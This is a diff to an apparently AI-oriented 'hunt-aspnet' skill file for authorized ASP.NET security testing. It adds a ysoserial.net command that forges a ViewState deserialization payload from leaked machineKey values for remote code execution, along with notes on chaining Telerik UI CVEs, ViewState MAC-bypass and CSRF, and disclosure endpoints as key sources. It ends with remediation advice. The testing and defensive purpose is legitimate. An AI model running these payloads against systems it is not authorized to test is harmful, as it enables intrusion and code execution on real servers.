@@ -1,8 +1,11 @@
 ---
 name: hunt-aspnet
 description: Hunt ASP.NET-specific surface — ViewState deserialization (signed-only vs encrypted), machineKey recovery, dual-parser MAC-bypass anti-pattern, request-validator bypass, trace.axd/elmah.axd disclosure, load-balanced ViewState cross-node failures, SafeControl enumeration via reflection, customErrors mode=Off stack-trace leaks, classic Webforms .aspx/.asmx/.svc surface. Built for ASP.NET Webforms + WCF + SharePoint farms.
-sources: github, authorized-engagement
+sources: github, authorized-engagement, cve_database
 report_count: 1
+cwe: [CWE-502, CWE-209, CWE-16, CWE-347, CWE-611]
+cvss_baseline: "Medium (5.3) trace.axd/elmah/stack disclosure → High (7.5) machineKey/ViewState-key leak → Critical (9.8) ViewState deserialization RCE or Telerik RCE with recovered keys."
+related_skills: [hunt-deserialization, hunt-lfi, hunt-source-leak, hunt-sharepoint, hunt-rce]
 ---
 
 ## Crown Jewel Targets
@@ -267,6 +270,34 @@ Before writing the report, confirm:
 `trace.axd` 200 returns 50 most recent requests, including `Authorization: Bearer eyJ...` headers on API requests. `elmah.axd` 200 returns full error log with database connection-string in one of the exceptions. Reported severity: **Critical** (credentials in plaintext to anonymous internet).
 
 ---
+
+## New Techniques (2024-2026)
+
+### Leaked machineKey → ViewState deserialization RCE
+The canonical critical. If `machineKey` (validationKey/decryptionKey) leaks — web.config disclosure, LFI, source leak, or a **publicly-known static key** (Microsoft's 2025 advisory on publicly-exposed ASP.NET machine keys found in docs/samples and reused in prod) — forge a signed/encrypted ViewState gadget:
+```bash
+# ysoserial.net: generate a ViewState payload with the recovered keys
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c nslookup OOB" \
+  --validationkey=<HEX> --validationalg=SHA1 --decryptionkey=<HEX> --decryptionalg=AES \
+  --path="/page.aspx" --apppath="/"
+# POST as __VIEWSTATE (+ __VIEWSTATEGENERATOR) → RCE
+```
+Always try known/leaked keys before assuming ViewState is safe. Pair with `hunt-source-leak`/`hunt-lfi` to obtain the key.
+
+### Telerik UI RCE (recurring)
+`RadAsyncUpload` — **CVE-2019-18935** (insecure deserialization, needs leaked `telerikEncryptionKey`) and the older CVE-2017-11317/11357; `Telerik.Web.UI.DialogHandler`/`SpellCheckHandler` exposure. Fingerprint `Telerik.Web.UI.WebResource.axd?type=rau`; chain a leaked key → RCE.
+
+### ViewStateUserKey-absent CSRF & VIEWSTATE MAC bypass
+No `ViewStateUserKey` → classic ViewState-replay CSRF; historic MAC-disable/`__VIEWSTATEMAC` bypass (CVE-2020-1147 / the dual-parser anti-pattern this skill documents) when `enableViewStateMac` is off or the alternate parser path is reachable.
+
+### Disclosure endpoints as key/stack sources
+`trace.axd`, `elmah.axd`, `/_vti_bin/`, `customErrors=Off` YSOD, and `%u`-encoded request-validation bypasses leak stack traces, versions, and sometimes config → feed the key-recovery chain.
+
+## Remediation
+
+- Keep `enableViewStateMac` on (default), set a per-user `ViewStateUserKey`, and **rotate any machineKey that may be exposed**; never use example/static keys; encrypt ViewState.
+- Remove/patch Telerik UI to a fixed version and rotate `telerikEncryptionKey`; disable `RadAsyncUpload` if unused.
+- Disable `trace.axd`/`elmah.axd` and `customErrors` in production; keep web.config out of the served path; prefer `[ValidateAntiForgeryToken]` over ViewState for CSRF on MVC.
 
 ## Related Skills & Chains
 
